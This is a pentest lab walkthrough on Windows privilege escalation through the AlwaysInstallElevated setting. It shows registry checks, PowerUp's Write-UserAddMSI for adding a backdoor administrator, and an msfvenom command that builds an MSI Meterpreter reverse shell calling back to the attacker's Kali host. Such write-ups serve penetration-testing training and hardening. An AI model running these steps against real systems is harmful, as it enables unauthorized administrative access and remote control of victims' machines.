# 💽 AlwaysInstallElevated

AlwaysInstallElevated is a functionality within Windows that allows all users, including non-administrative ones, to automatically run any MSI (Microsoft Installer) file with elevated privileges. This capability can be exploited in the context of Windows privilege escalation. When an attacker leverages the AlwaysInstallElevated setting, they can manipulate MSI packages to execute arbitrary code with elevated permissions, potentially leading to unauthorized access and control over the system.

To escalate privileges using AlwaysInstallElevated, attackers can create and deploy malicious MSI files, taking advantage of the automatic elevation granted by this setting. By doing so, they can execute code in the context of higher-privileged accounts, achieving a form of privilege escalation.

<figure><img src="../../../../../.gitbook/assets/image (407).png" alt=""><figcaption></figcaption></figure>

first we need to check if AlwaysInstallElevated is =1 :

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

<figure><img src="../../../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

now in the cms we do:

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

<figure><img src="../../../../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

1. `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` queries the local machine's registry for Windows Installer policies at the system level \[[1](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)].
2. `reg query HKCU\Software\Policies\Microsoft\Windows\Installer` queries the current user's registry for Windows Installer policies specific to that user \[[1](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)].

These commands target different registry hives. The former looks at the machine-wide settings, affecting all users, while the latter focuses on settings applicable only to the currently logged-in user.

[Microsoft - reg query](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)

Let's chech who is in the administrators localgroup:

```
net localgroup administrators
```

<figure><img src="../../../../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

The `net localgroup administrators` command is used to display a list of users who are members of the local "Administrators" group on a Windows computer. When you run this command in the command prompt, it provides information about the users belonging to the administrators group, offering insights into the local administrative privileges on the system

* [Wikiversity - Net (command)/Localgroup](https://en.wikiversity.org/wiki/Net\_\(command\)/Localgroup)
* [Microsoft - Net localgroup](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc725622\(v=ws.11\))

In the autorun section we launched the PowerUp tool:

<figure><img src="../../../../../.gitbook/assets/image (153).png" alt=""><figcaption><p>we are going to use it now </p></figcaption></figure>

We simply look for the AlwaysInstallElevated part in the script output

<figure><img src="../../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

so it pretty much tells us that the abuse function for AlwaysInstallElevated is `Write-UserAddMSI`

1. **Function Purpose:** "Write-UserAddMSI" is designed to exploit the "AlwaysInstallElevated" registry setting in Windows. This setting allows non-administrative users to install Microsoft Installer Packages (MSI) with elevated privileges.
2. **Malicious MSI Creation:** The function likely facilitates the creation of a malicious MSI package that, when executed, performs unauthorized actions or grants elevated privileges to a user.
3. **Privilege Escalation:** By abusing "AlwaysInstallElevated" with "Write-UserAddMSI," an attacker can escalate their privileges, potentially gaining administrative access on the system.
4. **Backdoor Installation:** It suggests the ability to install a backdoor or perform actions that may compromise the security of the system.
5. [Juggernaut Security - AlwaysInstallElevated – Windows Privilege Escalation](https://juggernaut-sec.com/alwaysinstallelevated/)
6. [Hacking Articles - Windows Privilege Escalation (AlwaysInstallElevated)](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/)
7. [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
8. [Offsec Journey - Local Priv Esc - Windows](https://notes.offsec-journey.com/privilege-escalation/local-privilege-escalation)

So now let's abuse this, let's do a&#x20;

```
Write-UserAddMSI
```

<figure><img src="../../../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

In essence, the command is instructing PowerSploit to create a new MSI file named "UserAdd.msi" in the local directory. This MSI file contains configurations or instructions for adding a user, that will be abused for privesc

if we go and look in the local file, we can see some change:

<figure><img src="../../../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

we double-click on it and see some interesting stuff:

<figure><img src="../../../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

it asks us to add a user in the administrators group, check mate

and if we run the command again:

<figure><img src="../../../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

our backdoor user has been added to the group

Let's do this another way,

on your local kali open a msfconsole reverse shell:

<figure><img src="../../../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

now in another terminal you run this:

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
```

<figure><img src="../../../../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

* **msfvenom:** This is the command-line interface for Metasploit's payload generator.
* **-p windows/meterpreter/reverse\_tcp:** Specifies the payload to be generated. In this case, it's a reverse TCP Meterpreter shell for a Windows target.
* **lhost=\[Kali VM IP Address]:** Sets the listening host IP address. Replace `[Kali VM IP Address]` with the actual IP address of your Kali Linux machine. This is the IP where the target machine will connect back.
* **-f msi:** Specifies the format of the output file. Here, it's set to MSI (Microsoft Installer).
* **-o setup.msi:** Specifies the output file name, which is set to `setup.msi`. This is the name of the generated MSI file.

Now we need to upload this payload on our target so let's go and make a local http server:

<figure><img src="../../../../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

didn't make a very secure place for our server, but hey, better work next time,

<figure><img src="../../../../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

and now on our listener:

<figure><img src="../../../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

just like that, another way of obtaining a shell :smile:
